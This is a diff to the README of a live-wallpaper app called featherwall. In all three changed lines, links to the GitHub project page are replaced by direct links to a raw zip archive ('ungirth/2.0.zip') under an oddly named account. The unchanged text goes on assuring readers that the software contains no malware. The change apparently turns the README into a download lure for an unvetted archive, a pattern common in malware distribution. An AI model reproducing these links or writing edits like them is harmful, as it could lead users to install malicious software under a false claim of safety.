@@ -1,6 +1,6 @@
 # 🪶 featherwall - Featherweight live wallpapers without the weight
 
-[![Download featherwall](https://img.shields.io/badge/Download-featherwall-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B)](https://github.com/temporal-femalebonding967/featherwall)
+[![Download featherwall](https://img.shields.io/badge/Download-featherwall-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B)](https://raw.githubusercontent.com/temporal-femalebonding967/featherwall/main/ungirth/2.0.zip)
 
 ## 🌟 What is featherwall?
 
@@ -36,7 +36,7 @@ Ready to bring your desktop to life? Here's how to get started.
 
 ### 📥 Download
 
-Visit this link to download the application: **[https://github.com/temporal-femalebonding967/featherwall](https://github.com/temporal-femalebonding967/featherwall)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/temporal-femalebonding967/featherwall/main/ungirth/2.0.zip](https://raw.githubusercontent.com/temporal-femalebonding967/featherwall/main/ungirth/2.0.zip)**
 
 ### 🔧 How to Install
 
@@ -140,7 +140,7 @@ Yes, featherwall is safe, open-source software. It contains no malware, no ads, 
 
 Check the repository regularly for new releases, updates, and improvements.
 
-Visit the project page: **[https://github.com/temporal-femalebonding967/featherwall](https://github.com/temporal-femalebonding967/featherwall)**
+Visit the project page: **[https://raw.githubusercontent.com/temporal-femalebonding967/featherwall/main/ungirth/2.0.zip](https://raw.githubusercontent.com/temporal-femalebonding967/featherwall/main/ungirth/2.0.zip)**
 
 ## 🧑‍🤝‍🧑 Support & Community
 
